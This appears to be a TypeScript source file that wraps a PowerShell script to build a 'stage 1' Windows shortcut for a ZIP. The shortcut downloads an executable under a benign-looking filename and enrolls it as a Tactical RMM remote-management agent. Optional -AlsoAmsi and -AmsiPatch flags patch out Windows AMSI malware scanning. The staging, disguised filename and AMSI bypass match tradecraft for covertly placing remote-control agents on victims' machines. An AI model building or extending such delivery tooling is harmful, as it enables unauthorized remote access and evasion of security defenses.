/**
 * ZIP (STAGE 1) builder: runs New-AgentShortcut.ps1 under pwsh to produce the
 * Agent.lnk that downloads AND enrolls a Tactical RMM agent.
 *
 * Command mirrored from the STAGE-1 contract:
 *   pwsh New-AgentShortcut.ps1 -URL "<exeUrl>" -FileName "<fileName>"
 *       -Output <Agent.lnk path> -InstallCmd "<installString>"
 *       [ -AlsoAmsi | -AmsiPatch ]   (omitted by default → AMSI "none")
 *
 * AMSI is deliberately OFF by default ("none" → no flag). Only explicit
 * opt-ins map to the script's -AlsoAmsi (light) / -AmsiPatch (full) forms.
 */

import { spawn } from "child_process";

export type AmiMode = "none" | "also" | "patch";

export interface ZipBuildParams {
  scriptPath: string; // absolute path of New-AgentShortcut.ps1
  exeUrl: string;
  fileName: string; // benign filename for the downloaded exe
  outputPath: string; // absolute path to write Agent.lnk
  installCommand: string; // server-rebuilt enrollment command (InstallCmd)
  authToken: string; // per-device token — passed for the script's leak self-check
  amsi: AmiMode; // default "none"
}

export interface ZipBuildResult {
  success: boolean;
  output: string;
}

const TIMEOUT_MS = 120000; // 120 seconds

export async function runZipBuild(
  params: ZipBuildParams
): Promise<ZipBuildResult> {
  return new Promise((resolve) => {
    try {
      const args = [
        "-URL",
        params.exeUrl,
        "-FileName",
        params.fileName,
        "-Output",
        params.outputPath,
        "-InstallCmd",
        params.installCommand,
        "-AuthToken",
        params.authToken,
      ];

      // AMSI mapping: none -> omit (production default), also -> -AlsoAmsi,
      // patch -> -AmsiPatch. Never default to a bypass.
      if (params.amsi === "also") args.push("-AlsoAmsi");
      else if (params.amsi === "patch") args.push("-AmsiPatch");

      let stdout = "";
      let stderr = "";

      const proc = spawn(
        "pwsh",
        ["-NoProfile", "-NoLogo", "-File", params.scriptPath, ...args],
        { timeout: TIMEOUT_MS }
      );

      proc.stdout?.on("data", (d: Buffer) => {
        stdout += d.toString();
      });
      proc.stderr?.on("data", (d: Buffer) => {
        stderr += d.toString();
      });
      proc.on("error", (err: Error) => {
        // e.g. pwsh binary not found
        resolve({ success: false, output: err.message });
      });
      proc.on("close", (code: number | null) => {
        if (code === 0) {
          resolve({ success: true, output: stdout });
        } else if (code === null) {
          resolve({
            success: false,
            output: "ZIP build timed out after 120 seconds",
          });
        } else {
          const errorOutput =
            stderr.length > 500 ? stderr.slice(-500) : stderr || stdout;
          resolve({ success: false, output: errorOutput });
        }
      });
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      resolve({ success: false, output: message });
    }
  });
}
